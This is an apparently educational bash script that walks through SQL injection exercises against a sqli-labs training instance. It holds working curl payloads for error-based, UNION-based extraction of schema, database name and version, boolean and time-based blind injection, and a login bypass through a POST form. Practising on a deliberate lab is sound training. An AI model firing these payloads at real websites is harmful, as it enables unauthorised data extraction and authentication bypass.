#!/bin/bash
# Bash SQLi Testing Examples
#
# Replace $ip with your GCP instance external IP.

ip="34.44.221.51"

# Visit /show-queries.php to see the SQL queries being executed.
# Visit /show-queries.php?clear=1 to clear the query log.

# Function that removes boring HTML tags
remove_boring_html_tags() {
    local input="$1"

    # Remove DOCTYPE, html, head tags
    input=$(echo "$input" | sed -E 's|<!DOCTYPE[^>]+>| |g')
    input=$(echo "$input" | sed -E 's|<html[^>]+>| |g')
    input=$(echo "$input" | sed -E 's|<head[^>]+>| |g')
    input=$(echo "$input" | sed -E 's|<meta[^>]+>| |g')

    # Remove closing tags
    input=$(echo "$input" | sed -E 's|</html>| |g')
    input=$(echo "$input" | sed -E 's|</head>| |g')
    input=$(echo "$input" | sed -E 's|</body>| |g')
    input=$(echo "$input" | sed -E 's|</title>| |g')

    echo "$input"
}

# Function that replaces multiple newlines with a single newline
replace_multiple_newlines() {
    local input="$1"

    # Replace 2 or more consecutive newlines with a single newline
    echo "$input" | sed -E ':a;N;$!ba;s/\n{2,}/\n/g'
}

# Trim and replace multiple newlines with a single newline
better_trim() {
    local input="$1"

    # Remove HTML tags
    input=$(remove_boring_html_tags "$input")

    # Trim whitespace and replace multiple newlines
    input=$(echo "$input" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
    input=$(replace_multiple_newlines "$input")

    echo "$input" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//'
}

# ============================================================================
# Less-1: Error-Based String Injection
# ============================================================================

# Normal Request
#payload="1"
#better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'password'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1' LIMIT 0,1
# This SQL output is actually really useful - it shows us exactly where our '1' is being inserted into.

# Simple vulnerability test...
# Single quote causes SQL error
payload="1'"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'error'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1'' LIMIT 0,1
# Still useful! We can see the extra single quote
exit 0

# Confirm with comment
payload="1'--"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'error'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1'--' LIMIT 0,1

# Extract data or test if we can successfully run a SQL command
payload="1' OR '1'='1"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'password'
# Raw SQL from /show-queries.php
# SELECT * FROM users WHERE id='1' OR '1'='1' LIMIT 0,1


# UNION-based injection to extract database names
# First, find the number of columns (this query has 3: id, username, password)
# Note: # must be URL-encoded as %23
# Use -1 or 999 to make first query return no rows, so UNION result shows
payload="-1' UNION SELECT 1,2,3%23"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")"
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3#' LIMIT 0,1
# Should show: Your Login name:2  Your Password:3

# Extract first schema name from information_schema
payload="-1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata LIMIT 1%23"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'password|Login'
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata LIMIT 1#' LIMIT 0,1

# Extract current database name
payload="-1' UNION SELECT 1,database(),3%23"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'password|Login'
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,database(),3#' LIMIT 0,1
# Should show: Your Login name:security

# Extract MySQL version
payload="-1' UNION SELECT 1,@@version,3%23"
better_trim "$(curl -s "http://$ip/Less-1/?id=$payload")" | grep -E 'password|Login'
# Raw SQL: SELECT * FROM users WHERE id='-1' UNION SELECT 1,@@version,3#' LIMIT 0,1


# ============================================================================
# Less-2: Error-Based Numeric Injection
# ============================================================================

# Normal Request
curl -s "http://$ip/Less-2/?id=1" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//'

# Test for Vulnerability

# Boolean-based
curl -s "http://$ip/Less-2/?id=1 AND 1=1"
curl -s "http://$ip/Less-2/?id=1 AND 1=2"

# Extract all rows
curl -s "http://$ip/Less-2/?id=1 OR 1=1"

# ============================================================================
# Less-3: String with Twist (')
# ============================================================================

# Test for Vulnerability
curl -s "http://$ip/Less-3/?id=1'"
curl -s "http://$ip/Less-3/?id=1') OR ('1'='1"

# ============================================================================
# Less-4: Double Quotes
# ============================================================================

# Test for Vulnerability
curl -s "http://$ip/Less-4/?id=1\""
curl -s "http://$ip/Less-4/?id=1\") OR (\"1\"=\"1"

# ============================================================================
# Less-8: Blind Boolean-Based
# ============================================================================

# Test for Vulnerability

# True condition (page loads normally)
curl -s "http://$ip/Less-8/?id=1' AND '1'='1"

# False condition (different response)
curl -s "http://$ip/Less-8/?id=1' AND '1'='2"

# ============================================================================
# POST-Based Example (Less-11)
# ============================================================================

# Normal login
curl -s "http://$ip/Less-11/" -X POST -d "uname=admin&passwd=password"

# SQL Injection
curl -s "http://$ip/Less-11/" -X POST -d "uname=admin' OR '1'='1&passwd=anything"

# ============================================================================
# Useful Bash/curl Tips
# ============================================================================

# View Response Content
response=$(curl -s "http://$ip/Less-1/?id=1")
echo "$response"

# View Status Code
curl -s -o /dev/null -w "%{http_code}" "http://$ip/Less-1/?id=1"

# Measure Response Time (Blind Time-Based)
time curl -s "http://$ip/Less-9/?id=1' AND SLEEP(5)--"

# Save Response to File
curl -s "http://$ip/Less-1/?id=1" -o response.html

# ============================================================================
# URL Encoding in Bash
# ============================================================================

# You can use curl's --data-urlencode for automatic encoding:
# curl -G "http://$ip/Less-1/" --data-urlencode "id=1' OR '1'='1"

# Or manually encode special characters:
# Space: %20
# Single quote: %27
# Double quote: %22
# Hash/pound: %23
